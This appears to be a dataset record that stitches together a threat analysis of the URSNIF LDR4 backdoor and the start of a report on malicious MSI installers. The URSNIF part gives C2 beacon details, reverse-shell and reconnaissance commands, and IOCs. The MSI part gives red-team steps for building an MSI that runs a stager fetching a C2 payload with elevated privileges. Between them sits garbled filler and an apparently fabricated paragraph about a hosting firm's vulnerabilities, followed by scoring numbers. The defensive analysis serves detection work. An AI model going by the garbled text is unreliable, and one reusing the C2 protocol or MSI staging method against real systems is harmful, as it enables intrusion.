binaries we encountered contained two embedded commands: ""echo Commands"" and ""dir"".The C2 servers are contacted one by one trying to download the file TASK.BIN which contains a list of commands to perform. The list of potential commands is detailed in the Capabilities section.Network CommunicationThe communication protocol used by LDR4 does not differ too much from the protocol used by the older RM3 variant. It uses POST requests over HTTPS, with beacon URLs ending in /index.html. The User Agent string depends on the exact Windows version and architecture with the following format:Mozilla/5.0 (Windows NT %d.%d, %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36The use of an outdated Chrome version in the User Agent string provides a good detection opportunity in environments where a proxy server oversees outbound HTTP/HTTPS connections, and can block or alert based on the User Agent string.The beacon request's query string uses the following format (which is almost the same as RM3's beacon format):version=%u&user=%s&group=%u&system=%s&file=%08x&arc=%u&crc=%08x&size=%uThe meaning of the parameters is detailed in the following table:Parameter Name Description version Bot version, e.g., ""100123"" (1.00.123) user User ID group Botnet ID system System ID file File ID (the JAMCRC32 checksum of the uppercase filename) arc File architecture (0 - x86, 1 - x64) crc File checksum (only if it was downloaded before, otherwise 0) size File size (only if it was downloaded before, otherwise 0)A fake parameter consisting of a random name and value is prepended to the aforementioned query string, every time a request is made, then the entire request string is encrypted using AES-256 in CBC mode, with an embedded key (see ServerKey in the Configuration section) and an initialization vector (IV) consisting of sixteen ""0"" characters, then encoded using Base64 (any ending ""="" characters are stripped from the end of the encoded string), and then sent as the payload of a POST request.Example query string of an initial beacon (file ID 0x8fd8a91e corresponds to the filename TASK.BIN):clypnrkl=wsktexbmn&version=100123&user=f2472a25a2e15c3d&group=202208152&system=18245c7ff14d7902&file=8fd8a91e&arc=0&crc=00000000&size=0Example query string for subsequent beacons (existing TASK.BIN size is 320 bytes, and the checksum of its contents is 0x3e3edc47):chjm=kckhu&version=100123&user=f2472a25a2e15c3d&group=202208152&system=18245c7ff14d7902file=8fd8a91e&arc=0&crc=3e3edc47&size=320Example network beacon (with the request string encrypted with AES, and encoded as Base64):POST /index.html Host: logotep[.]xyz Cache-Control: no-cache Connection: Keep-Alive Pragma: no-cache Content-Type: multipart/form-data, boundary=9808fdecfe274c1d User-Agent: Mozilla/5.0 (Windows NT 10.0, Win64, x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 Content-Length: 285 --9808fdecfe274c1d Content-Disposition: form-data, name=""rcgmbh"" QgrHabeBs9/vsorhqEP2jV88dSwmgvyxepEZczkNSFXt89yV2nH9/7A5QYcIslSIoimlOmGG53oykoFVIfcrge6eCwchr62tLGsho13OHolmwJBYFYH0+sxqa1AH8qV4CEjKX+UwyioMNnv0QlW9pagvAc6JMo1JoTHjrqaci07r/dByQSndma/MhZU1aIrI--9808fdecfe274c1d--All of the control servers that we identified used domain names consisting of 5-10 letters, were registered under the .xyz, .cyou or .com top-level domains, and used Let's Encrypt TLS certificates. The domain names are registered with Namecheap, and the infrastructure is hosted at a company named Stark Industries Solutions Ltd., registered in the UK in February 2022. This company is listed on the website for Perfect Quality Hosting (aka. PQ Hosting).ConfigurationAs mentioned, in the LDR4 variant of URSNIF, the configuration storage was significantly reworked. Previous URSNIF variants used magic markers to locate additional files that were embedded into the binary, called joined files. The magic markers varied between different URSNIF variants, i.e. JF, JJ, J1, J2, or WD.This new LDR4 variant introduces a new data structure for storing joined files, which are now merged with the strings in the encrypted .bss section.Figure 9: LDR4 decrypted .bss section structureThe data structure has an 8-byte header, and has the following fields:Data Size Field Name Description 2 bytes NextOffset The offset to the next element in the linked list, if zero, then no more elements 2 bytes ItemSize The size of the data in bytes in the ItemValue field 4 bytes ItemID A value that uniquely identifier the item, this is usually the JAMCRC32 hash of the item name ItemSize bytes ItemValue The value of the current elementThere are two joined files that must always be present, otherwise the malware will not operate: the bot configuration, and the RSA public key that is used to decrypt and verify responses from the command server. Like in other URSNIF variants, the configuration options are identified by a hexadecimal number, which is the JAMCRC32 checksum of the option's uppercase name. Note, that the name of the option is not referenced anywhere in the binary or in the configuration, and it is only possible to find it out by brute-forcing the checksum.List of currently known configuration options:Option ID Option Name Description 0xb892845a Controller List of C2 URLs used for communication (whitespace separated) 0x656b798a Group Botnet ID 0x4fa8693e ServerKey AES key used for communicating with the C2 0x8c871ff9 IdleTime Number of seconds to wait before the initial request to the C2 0x9d29ade4 RequestTime Number of seconds between beacon requests to the C2 0xf76f421a HostKeepTime In case of communication failures, the number of minutes to wait before trying the next C2 server 0x08b2f0fb HostShiftTime In case of successful communication, the number of minutes to wait before switching to the next C2 server 0x89a5deaa RunCommand Embedded initial command list to execute upon startup 0x303378c6 <unknown> Unknown timeout parameter, probably unused as of nowCapabilitiesThe following commands are implemented in the malware:Command ID Command Name Description 0xf880e2be LOAD_DLL Load a DLL module into the current process 0xfee861f1 SHELL_STATE Retrieve the state of the cmd.exe reverse shell 0xc202e685 SHELL_START Start the cmd.exe reverse shell 0xa5946e4a SHELL_STOP Stop the cmd.exe reverse shell 0xa04d6355 SHELL_RESTART Restart the cmd.exe reverse shell 0x5d2295b5 RUN_COMMAND Run an arbitrary command 0x5d639645 EXIT TerminateThe two most common commands that we have observed sent out to new victims are related to network reconnaissance:RUN_COMMAND=net group ""domain computers"" /domainRUN_COMMAND=net sessionThe same two commands were also observed from the RM3 variant of URSNIF in the past, which is another behavioral trait that proves the connection between the two variants.Command ShellThe built-in command shell functionality provides a reverse shell that connects to a remote IP address and gives the attackers the ability to execute system commands via the cmd.exe program. This functionality is almost an exact copy to what the RM3 variant provided via its separate cmdshell.dll plugin. The remote IP address and port number to connect to is provided at run time, as an argument to the SHELL_START command. This functionality gives the attackers the ability to perform hands-on-keyboard attacks, perform further host and network reconnaissance, and do lateral movement.PluginsPrevious URSNIF variants had a feature that allowed the capabilities of the malware to be extended with various plugins loaded via the LOAD_PLUGIN command, which was not implemented in the URSNIF LDR4 binary we analyzed. However, we have observed at least one occasion where a VNC module was downloaded via the LOAD_DLL command. The LOAD_DLL command thus allows for a simpler, more generic way of providing a plugin-like feature by extending the features of the malware via arbitrary DLL modules (in contrast to regular plugin DLLs, which must be implemented in a specific way to work with the main malware). Interestingly, the VNC module still uses an older way of storing its embedded configuration (using the J1 magic bytes), so it is possible that it was originally compiled for a different URSNIF variant (likely for IAP 2.0).VNC module Filename vnc64_1.dll Internal name VncDLL.dll MD5 hash bd4a92d4577ddedeb462a71cdf2fa934 PE timestamp Tue Sep 14 19:32:19 2021 Embedded VNC C2 141[.]98.169.6:80AttributionSome of the LDR4 control servers are configured to leak detailed error messages and file paths, and the file paths indicate that the bot panel is installed into the home directory of the user expro with the directory name www_loader_ldl (Figure 10).Figure 10: Error message from the C2 server revealing the expro home directoryThis supports our current understanding that expro is the nickname of the web developer responsible for the bot panel for both the RM3 and LDR4 variants.ImplicationsThe demise of the RM3 variant earlier this year, and the author's decisions to make heavy simplifications to their code, including the removal of all banking related features, point toward a drastic change in their previously observed TTPs. These shifts may reflect the threat actors' increased focus towards participating in or enabling ransomware operations in the future. This assessment is further supported by the fact that Mandiant identified an actor operating in underground communities seeking partners to distribute a new ransomware and the URSNIF RM3 variant, which is highly similar to the new LDR4 variant, since at least early 2022AcknowledgementsThe authors would like to thank Benoit Ancel for providing additional malware IOCs in relation to the LDR4 variant, and Cian Lynch for spotting the initial malware sample.Appendix A: Comparison with other recently active URSNIF variantsIAP 2.0 RM3 LDR4 Persistence method Scheduled task that executes code stored in a registry key using PowerShell Scheduled task that executes code stored in a registry key using PowerShell No persistence Configuration storage Security PE directory points to embedded binary data starting with 'JJ' magic bytes Security PE directory points to embedded binary data starting with 'WD' magic bytes Hidden into the encrypted .bss section PRNG algorithm Various xorshift64* Various Checksum algorithm JAMCRC (aka. CRC32 with all the bits flipped) JAMCRC (aka. CRC32 with all the bits flipped) JAMCRC (aka. CRC32 with all the bits flipped) Data compression aPLib aPLib No compression Encryption/Decryption Old versions: Serpent CBC New versions: AES-256 CBC Old versions: Serpent CBC New versions: AES-256 CBC AES-256 CBC Data integrity verification RSA signature RSA signature RSA signature Communication method HTTP GET/POST requests HTTP GET/POST requests HTTP POST requests Payload encoding Unpadded Base64 ('+' and '/' are replaced with '_2B' and '_2F' respectively), random slashes are added Unpadded Base64 ('+' and '/' are replaced with '_2B' and '_2F' respectively), random slashes are added Unpadded Base64 ('+' and '/' are URL encoded as '%2B' and '%2F' respectively), random slashes are NOT added Uses URL path mimicking? No Yes No Uses PX file format? No Yes No Embedded commands in binary Yes No YesAppendix B: IOCsMalware sample hashes:360417f75090c962adb8021dbb478f67 [ VT3e0f28bcaf35af2802f45b58f49481be590d96a7be55240ad868ebec78ce38f28c658b9b02814927124351484c42a272 [ VT9f68d1a4b33e3ace6215040dc9fc73e8 [ VTb4610d340a9bff58616543b10e961cd3baa784967fd0558715f4011a72eb872e [ VTbd4a92d4577ddedeb462a71cdf2fa934bea60bab50d47f239132890a343ae84c [ VTd38f6f01bb926df07d34de0649f608f6 [ VTd6ef4778f7dc9c31a0a2a989ef42d2fd [ VTd94657449f8d8c165ef88fd93e463134 [ VTeee617806c18710e8635615de6297834 [ VTf4b0a6ab164f7c58cccce651606caede [ VTMalware sample hashes (unpacked):00b981b4d3f47bcbd32dfa37f3b947e5 [ VT09bc2a1aefbafd3e7577bc3c352c82ad [ VT1b0ec09ca4cb7dcf5d59cea53e1b9c933c5f002b46ef11700caca540dcc7c519498d5e8551802e02fe4fa6cd0425c60858169007c2e7a0d022bc383f9b9476fe [ VT7808d22a4343b2617ceef63fd0d436517eea48e592c4bccbfa3929b1b35a7c0b89b4dd18bea842fddd021aa74d109ec3a3539bc682f39406c050e5233058c930 [ VTac39f1a22538f0211204037cce30431dc1989d25287cd9044b4d936e73962e35c7facfffad15a9c84239b495770183bbcde05576e7c48ca89d2f21c283a4a018 [ VTNetwork indicators (domains):astope[.]xyzbinchfog[.]xyzdamnater[.]comdaydayvin[.]xyzdodsman[.]comdodstep[.]cyoufineg[.]xyzfingerpin[.]cyoufishenddog[.]xyzgiantos[.]xyzgigeram[.]comgigiman[.]xyzgigimas[.]xyzhigmon[.]cyouisteros[.]comkidup[.]xyzlionnik[.]xyzlogotep[.]xyzmainwog[.]xyzmamount[.]cyouminotos[.]xyzpinki[.]cyoupipap[.]xyzprises[.]cyoureaso[.]xyzrorfog[.]comtornton[.]xyzvavilgo[.]xyzNetwork indicators (IP addresses):5[.]182.36.248 (CH) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)5[.]182.37.136 (RU) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)5[.]182.38.43 (HU) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)5[.]182.38.68 (HU) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)5[.]252.23.238 (SK) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)45[.]8.147.179 (SE) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)45[.]8.147.215 (SE) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)45[.]67.34.75 (RO) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)45[.]67.34.172 (RO) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)45[.]67.34.245 (RO) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)45[.]67.229.39 (MD) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)45[.]89.54.122 (SK) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)45[.]89.54.152 (SK) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)45[.]95.11.62 (SK) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)45[.]140.146.241 (MD) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)45[.]142.212.87 (MD) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)45[.]150.67.4 (MD) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)77[.]75.230.62 (CZ) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)77[.]91.72.15 (HU) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)94[.]131.100.71 (FI) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)94[.]131.100.209 (FI) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)94[.]131.106.8 (NL) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)94[.]131.106.16 (NL) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)94[.]131.107.13 (NL) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)94[.]131.107.132 (NL) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)94[.]131.107.252 (NL) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)141[.]98.169.6 (FI) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)185[.]250.148.35 (MD) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)188[.]119.112.104 (NL) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)193[.]38.54.157 (NL) - ISP: STARK INDUSTRIES SOLUTIONS LTD (GB)User Agent strings:Mozilla/5.0 (Windows NT <os_version> , WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36Mozilla/5.0 (Windows NT <os_version>, Win64, x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36Appendix C: YARA ruleThe following YARA rule is not intended to be used on production systems or to inform blocking rules without first being validated through an organization's own internal testing processes to ensure appropriate performance and limit the risk of false positives. This rule is intended to serve as a starting point for hunting efforts to identify new LDR4 samples, however, it may need adjustment over time if the malware family changes.";"Mandiant believes that the same threat actors who operated the RM3 variant of URSNIF are likely behind LDR4. Given the success and sophistication RM3 previously had, LDR4 could be a significantly dangerous variantcapable of distributing ransomwarethat should be watched closely. The LDR4 variant no longer uses the custom PX executable format, that was first introduced by the RM3 variant. We believe this choice was made to avoid overcomplicating the troubleshooting of software issues. From a developer's point of view, spending more time that is supposed into some superficial layer of issues and refocusing into more important pipelines of requested features are crucial for your reputation. Equally important, given the notoriety of the PX format among analysts and AV/EDR products, it was only a matter of time for that path to come to an end. From the attacker's perspective, investing in a product that everyone knows how to detect, is not a very efficient use of resources, so going back to the roots with a classic PE format is in fact a rational choice on their side. FJ.exe gone or reworked?Since the beginning of ISFB, a steganography tool called FJ.exe (File Joiner) is used for hiding multiple files into a single payload. This one isn't unique to ISFB but forked from another notorious banking malware called CARBERP. LDR4 is a backdoor.URSNIF is the latest malware following the same path that EMOTET and TRICKBOT did before, by focusing into a new strategy and leaving behind its banking fraud legacy. LDR4 is the proof of that statement by removing all its banking malware features and modules and only focusing into getting VNC and/or remote shell into the compromised machine.ObfuscationIt is a common practice in offensive software operations to apply some sort of obfuscation to the code itself or at least to API calls to thwart analysis efforts. URSNIF historically did not use this (except for the outermost crypter layer used for AV evasion). However, this new LDR4 variant incorporated obfuscation for the Windows API calls. First, it builds a hash lookup table from the export names and addresses of the Windows modules used by the malware (kernel32, ntdll, crypt32, advapi32, ws2_32), that maps the JAMCRC32 checksum (JAMCRC32 is the modification of the regular CRC32 algorithm, where all the bits of the final checksum are flipped) of the function names to their respective virtual addresses in memory. Later in the code, any invocation to the Windows API functions will just look up the checksum value in the table to quickly retrieve the function address. Apart from this, no further code obfuscation is leveraged in the compiled binaries, making LDR4 a relatively easy family to reverse engineer.BehaviorOne of the most noticeable things during analysis was that the developers had simplified and cleaned up various parts of the code, compared to previous variants. Most notably, its banking features were totally scrapped.The malware first locates the .bss section in the executable, and The output. The output. The output. The output. The output. The output. The output. The output. The output. The output. The output. The output. The output. The output. The output. The output. The output. The output. The output. the output. The output. The output. The output. The output report. The output, the output, the output, the output. The output. The output. The The following the report. The report, then, the report, the report, the report, the report, the report. . . . . , then, then, then, then. . . [ [ . ### Inputs ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ## . . . to: to: to: . cker. cker. , theft. . . to: . . . . . . . . . . . . . . . . . . . . STARK INDUSTRIES SOLUTIONS LTD (GB) has identified a number of security vulnerabilities in its IT systems. These vulnerabilities could be exploited by malicious actors to gain unauthorized access to sensitive data. The company has taken steps to mitigate the risks associated with these vulnerabilities, but further action is required to ensure the security of its IT systems. The following YARA rule is not intended to be used on production systems or to inform blocking rules without first being validated through an organization's own internal testing processes to ensure appropriate performance and limit the risk of false positives. This rule is intended to serve as a starting point for hunting efforts to identify new LDR4 samples; however, it may need adjustment over time if the malware family changes.";en;{'r': 0.21250797702616464, 'p': 0.919889502762431, 'f': 0.3452566065934023};{'r': 0.15975232198142414, 'p': 0.8417618270799347, 'f': 0.26854020028509046};{'r': 0.21123165283982132, 'p': 0.914364640883978, 'f': 0.3431829933222773}
https://www.cybereason.com/blog/threat-analysis-msi-masquerading-as-software-installer;Threat Analysis: MSI - Masquerading as a Software Installer;"The Cybereason Global Security Operations Center (GSOC) issues a Purple Team Series of its Threat Analysis reports to provide a technical overview of the technologies and techniques threat actors use to compromise victims' machines.In this Threat Analysis report, the Cybereason GSOC team analyzes a technique that utilizes Microsoft's Windows Installation file (.msi) to compromise victims' machines.This report is divided into four sections:Introduction: An overview of the MSI file format. Red Team: Offensive approach leveraging MSI files for attacking purposes. Blue Team: Defenders' perspective, studying how MSI files are exploited by threat actors. Purple Team: Detection proposals for possible malicious MSI files and analysis tools.KEY POINTSMasquerade as legitimate installer: Malicious MSI files are sometimes difficult to distinguish from legitimate installers. Threat actors will often masquerade as well-known software updates and manipulate victims into ""updating"" the software on their machines.Execute with elevated privilege: MSI allows execution with a LocalSystem account (NT Authority\System). The unauthorized access via LocalSystem privilege can lead to compromise of the system and to further network compromise.Numerous ways to exploit MSI : MSI is based on COM Structure Storage, which allows threat actors to store malicious files in a MSI file and to control stored files with custom actions. This technology gives threat actors a variety of options for execution patterns they can use to infect victims' machines.INTRODUCTIONThis chapter explains the fundamentals of Windows Installer packages (MSI).OverviewMSI, formerly known as Microsoft Installer, is a Windows installer package format. MSI allows for the installation and deployment of necessary Windows applications or packages to end-users' machines. MSI is a standardized installation method that simplifies the installation process for users. The installation process with MSI files is simple and often does not require much user interaction. Usually, the installation process with MSI is similar to running an executable.MSI utilizes Microsoft's technology COM Structured Storage, which allows an MSI file to have a file system structure. This technology is also referred to as OLE documents, components often used by Microsoft Office. This technology is constructed with two types of objects called storage and streams, which are conceptually similar to directories and files. This structure allows MSI components to store multiple files to allow for easy access.The ability to store and deploy necessary files with minimal user action makes this technology similar to self-extracting zip files, which are often in the form of executables.The installation procedure also allows execution with a LocalSystem account (NT Authority\System). The elevated privilege behavior as well as the COM Structure makes MSI an attractive malware deployment method for threat actors.StructureMSI contains a main stream called a Database stream. This section provides an overview of the Database stream and its relevant components.DatabaseThe Database stream consists of tables that form a relational database. These tables are linked with primary and foreign key values. This structure allows MSI to maintain relationships between the different tables and contain basic information required to perform the installation.Database stream, representing primary/foreign key relationshipsThe information within each table has important roles for the installation, such as tables storing information on installing software applications.File: Metadata of installing application files.Registry: Registry key values of installing applications.Shortcut: Shortcuts of relevant installing applications.Other tables include information about package executions of the installation and execution sequences. These tables are crucial for MSI to determine the execution flow, as well as the exact actions needed for the installation. The tables allow developers to manipulate the installation process and allow installation to have complex logic. The installation logic is often manipulated with Actions and Sequences.ActionsThe MSI contains a set of subroutines to execute the installation. These routines are divided into two types:Standard Actions: These are built-in actions that allow developers to perform the installation. Some notable actions include the following-Initialize installation directoriesDrop files to the installation directoriesAdd a registry value for the installing softwaresCustom Actions: Standard Actions may not be enough for developers to execute the installation logic. Custom actions allow developers to embed logic outside of Standard Actions by executing specific binary or scripts during the installation. Some notable custom actions include the following-Execute executables stored within the MSI file Execute specific exported functions from DLLs Execute JavaScript or Visual Basic scriptsThe above actions can be manipulated by utilizing Properties, which are similar to environment variables. Properties often contain various data and control parameters required to execute certain actions, including:A flag which identifies if reboot is neededInstallation directorySystem informationControl information on installationThe Property table exists within the Database Stream. However, note that not all properties are stored in the Property table. Since some Properties are set during the installation in specific actions, Properties that are set dynamically may not be in the Property table.SequencesDevelopers can set the order in which Standard Actions and Custom Actions are executed in the Sequence table. Within the Sequence table, they can assign conditions to control the actions' behavior.There are two main types of sequences:Install UI Sequence - This refers to the sequence of actions for installation UI, which includes user interactions with the dialog.Install Execute Sequence - This refers to the sequence of actions for actual installation execution, such as dropping files and creating registry entries. When conducting silent installation, the Install UI Sequence is ignored and only the Install Execute Sequence is used.For this report, the focus will be on the Install Execute Sequence, since this table is most relevant to the actual installation behavior.Example MSI database tables layout and its relationsRed TeamThis section describes how to reproduce the staging of a malicious MSI file, in order to analyze it and build detections for it. Similar to archived files, an MSI file can contain various malicious binaries or scripts to conduct its malicious actions.In this section, the MSI file will reference the MSFVenom template with minor updates. However the section will focus more on the inner workings of MSI file format.Malicious MSI execution flowMSI files can allow attackers to embed malicious binaries or scripts and take over the machine with elevated privileges. To demonstrate this, a malicious stager binary is embedded into an MSI file, which later fetches and executes the payload from the C2 server.The overall flow is as follows:Execute the MSI file. Execute the embedded binary. Execute the stager shellcode. Fetch and execute the payload from a C2 server. Terminate installation.The main usage here is to execute any relevant binary within memory without dropping any files to the disk.PreparationIn this section, we show how MSI files can be created using the Windows Installer XML(WiX) toolset. This is free software for building Windows Installer packages from XML files.WXS file content, showing Stager and ExitInstallation Custom ActionsThe executable needs to be stored in a table where it can be accessed by the CustomAction element prior to its execution. The Binary table is often used to place animations, bitmaps, and icons, however it also allows the MSI to store relevant binary data needed for CustomAction, even malicious PE files and scripts.Id assigns unique identifiers to the elements, which developers can call and utilize for specific actions. The MyStager id is assigned to the malicious executable stager.exe. This executable will allocate and execute stager shellcode.Binary and CustomAction elementsThe MyStager binary element is followed by a CustomAction element with Id Stager. This is the key element that will decide the behavior of the MyStager.Each attribute from the configuration of CustomAction is described below:BinaryKey: Attribute which specifies Binary element ID.Impersonate: Attribute which specifies if the installer impersonates the installing user's context. If attribute is no, then the installer will be executed with elevated privileges (LocalSystem).Execute: Attribute which specifies the scheduling of the CustomAction. The parameter ""deferred"" will delay the execution and allow the developer to control the specific CustomAction. This is the only value that allows the execution to run in elevated privileges.Return: Attribute which specifies the return behavior of CustomAction. asyncNoWait value allows the CustomAction to be executed asynchronously from the installer.ExeCommand: Attribute which specifies arguments for the executable.The CustomAction Stager is set up to execute the malicious executable stored in the Binary table with elevated privileges and to continue executing even after installation is terminated.CustomAction ExitInstallationAfter the MyStager setup, another CustomAction ExitInstallation is set to attempt executing VBScript. However, this execution will purposely fail and exit since this installation will not contain relevant VBScript. This CustomAction has another purpose which will be explained in the next paragraph.Once the CustomActions are set, the element InstallExecuteSequence, an Install Execute Sequence table, is set. For its first action, ResolveSource sets the source location and sourcedir property. This is needed to initialize the installation process. Once initialization is complete, the relevant CustomActions Stager and ExitInstallation will be set for the execution in this order respectively.ExitInstallation plays an important role in this execution, which will force the installation to purposely fail and exit. This then forces the MSI to exit with a failure. However, the malicious binary will continue executing since it is set up to run asynchronously. The victim may disregard this error and may not take into account that malicious activities are running in the background.ExecutionThe execution in this section assumes the victim retrieves the MSI file via phishing email. Once the file is deployed onto the victim's machine, the victim executes the MSI file by simply double-clicking. The execution prompts with a UAC warning, as execution is performed by a high-privilege user. Once the UAC warning is accepted by the user, the execution will proceed with the usual installation process.MSI process treeAfter MSI execution, the installation fails and exits with the following message:Error message due to CustomAction ExitInstallationThe MSI terminates itself, however, since the Stager is set to execute asynchronously, the malicious binary will continue executing.Attack Tree of MSI executionAs soon as MSI starts executing itself, the execution flow enters the malicious executable in the Custom Action, which is msia8a.tmp.Msia8a.tmp (the name will vary) proceeds to retrieve the payload from the C2 server and deploy it onto the victim's machine. Once the payload is successfully deployed, the stager continues executing the payload. Successful payload execution leads to successful connection to the C2 server, and it is also evident that the payload is being executed with an elevated privilege account. At this point, the attacker has remote control over the machine.Attacker's terminal, which is a Metasploit listenerExecution Flow ChartBlue TeamThis section focuses on an analysis of malware that abused MSI files in the past. Technical Analysis dives into MSI file usage by three different malware families seen in the wild. The section ends with Comparative Charts for each sample's MSI file execution.Technical AnalysisThis section analyzes three different malware families. The analysis focuses on the following Secure Hash Algorithm (SHA)-256 samples.Malware Family SHA-256 Magniber Ransomware 0e65657740d7f06acda53b7d3190f9728801b984d5bd6ccb0b865d218ae71f66 MatanBuchus Loader face46e6593206867da39e47001f134a00385898a36b8142a21ad54954682666 Qbot / Qakbot c0beb47f629a5debe0e99790d16a4d04afe786d6fb42c5ab6dfcaed84d86e7adMagniber RansomwareMagniber Ransomware is known to utilize infection methods such as exploiting vulnerabilities and masquerading as a legitimate software update to infect a victim's machine. The following are known infection methods seen in the past:Exploiting the PrintNightmare vulnerability.Masquerading as a legitimate Google Chrome or Microsoft Edge update by abusing Windows Application Package (.appx) files.Masquerading as legitimate Windows 10 upgrades by abusing MSI.MSI AnalysisAccording to file metadata, the MSI file is built with the WiX toolset.MSI file metadataThe presence of CustomAction in the table below provides a better idea of potentially malicious behavior:Sample's CustomAction table, as seen from the Orca toolThe CustomAction table has two actions configured:SetProgramFilesFolder: Set Program Files folder to local appdata folder (C:\Users\UserName\AppData\Local). h54pstl1: Fetch binary m21iivix0ds.SetProgramFilesFolder has Custom Action type 51, which indicates the action will configure the property's value. The Custom Action SetProgramFilesFolder configures the source ProgramFilesFolder property, which is a placeholder for the Program Files folder. ProgramFilesFolder is set to a value specified by the target LocalAppDataFolder property, which is a local appdata folder (e.g. C:\Users\UserName\AppData\Local).Sample's Directory table, as seen from the Orca toolThe Directory table includes information on the installation's directory location. As shown in the image, ProgramFilesFolder is seen to have Directory_Parent as the TARGETDIR property, which is the root installation directory. Based on the Directory and CustomAction tables, the installation directory will be placed under the local appdata directory.The Custom Action h54pstl1 has Type 65, which indicates combinations of the type and relevant options.Type 1: Indicates the DLL file is stored within the Binary Table.Optional Constant +64: Indicates that the execution will continue regardless of CustomAction failure.According to the Custom Action Type, m21iivix0ds is a DLL file stored in the Binary Table and is expected to execute the exported function t5thamku.Sample's Binary Table, as seen from the Orca toolIn order to identify at which point in the installation process the Custom Actions are executed, the InstallExecuteSequence table must be analyzed.Sample's InstallExecuteSequence table, as seen from the Orca toolThe actions with sequence number 800 to 1000 are related to costing of the installation, which is an action to calculate the amount of disk space in which relevant files are to be installed or removed. Since the cost of installation files are also related to the installation directory, the relevant directory needs to be configured. As a result, the SetProgramFilesFolder (Sequence number 999) action is within the costing process and the directory resolution configured in the Directory table is configured in the CostFinalize action.Custom Action h54pstl1 is executed right after InstallInitialize, which is a sequence for actual installation execution. Anything between InstallInitialize and InstallFinalize is part of the installation activities that will update and change the target system. At this point, the Custom Action h54pstl1 executes the exported function t5thamku with elevated privileges.InstallFiles is an action that places the relevant files in the destination location, which in this case is the destination set up by Custom Action SetProgramFilesFolder. This file information is often stored in the Media table, the File table, and the Component table.Sample's File table, as seen from the Orca toolReviewing the Media table, the MSI includes the cabinet file Product.cab. However, in the File Table, the file v514749 has a file size of 0. This indicates a cabinet file exists, but it does not drop any files during the installation. Even though the directory was configured via CustomAction and Directory tables, since no files will be dropped, the installation directory becomes irrelevant.Magniber MSI execution snippet, as seen from the Cybereason platformMagniber MSI infection flowMatanBuchus LoaderMSI AnalysisMatanBuchus is a Malware-as-a-Service (MaaS) platform developed by the threat actor BelialDemon and identified on Russian cybercrime forums in early 2021. Operating as a second-stage malware loader, MatanBuchus contains functionality to download and execute malicious payloads, run arbitrary PowerShell commands, and conduct stealthy C2 server communications.The malware itself has been observed being spread as a ZIP file in phishing emails. This file contains an HTML file which drops another ZIP file when accessed. This second ZIP file contains the MSI file that loads the MatanBuchus payload and initiates downloads from its C2 server.The loader for MatanBuchus payload is confirmed as an MSI file created using WiX through file metadata analysis. The file itself appears with the subject ""Adobe Font Pack 3.0.12.9"" and is signed by ""Westeast Tech Consulting, Corp."" in an attempt to masquerade as a legitimate Adobe file. However, it is notable that the certificate has been invalidated.MatanBuchus MSI File Metadata, through the file Unix utilityMatanBuchus MSI file digital signature informationAs with Magniber, investigating the file's CustomAction values can give a better understanding of how the file executes. The CustomAction table below contains two actions with the value 226, which is of type 34 with option 192. Custom Action Type 34 executes executables with the command line, and option 192 allows this execution to run asynchronously. These values indicate that the files can be executed even if MSI Installer itself fails. Regardless of whether MSI Installer fails or runs, the following Custom Actions will occur:regsvr32.exe will install main_dll.wscript.exe will execute notify_vbs.MatanBuchus MSI file digital signature information, as seen from the Orca toolThe source is defined as INSTALLLOCATION, which is confirmed through investigation into the Directory to be the LocalAppDataFolder.Directory Information, as seen from the Orca toolAccording to the File table below, two files main.dll and notify.vbs will be dropped into the INSTALLLOCATION directory. As shown in CustomAction table, the command line will execute each of these files, which replace formatted data types [main_dll] and [notify_vbs] with the actual file path.File metadata Information, as seen from the Orca toolThe [main_dll] and [notify_vbs] will not be replaced with an actual file path unless the Custom Actions are sequenced after CostInitialize, FileCost, and CostFinalize. The files also need to be dumped to the directory before executing via Custom Actions. Thus, the actions need to be executed after InstallInitialize, InstallFiles, and InstallFinalize actions. Consequently, both RunApplicationQQQ and RunApplicationNotifyVBS are sequenced at the very end of InstallExecuteSequence.Custom Actions placed in the very end of InstallExecuteSequence, as seen from the Orca toolSince MSI files are COM Structured Storage constructs, it is possible to dump the file's data streams via OLE in order to investigate the file further. While the output for initial analysis is unreadable, several data streams containing significant amounts of data can be observed.Matanbuchus MSI file OLE streamsInvestigating the fourth data stream reveals that it begins with the ASCII characters (MSCF), indicating that this stream is a Cabinet Archive (CAB) file.Fourth OLE stream dataBy dumping this stream and opening the archive, the files (in this case, main.dll and notify.vbs) are dropped. The file notify.vbs is notable because it contains an error message that appears related to Adobe Acrobat, this is an attempt to fool the user into believing that a legitimate Adobe Acrobat file did not run.In reality, while this 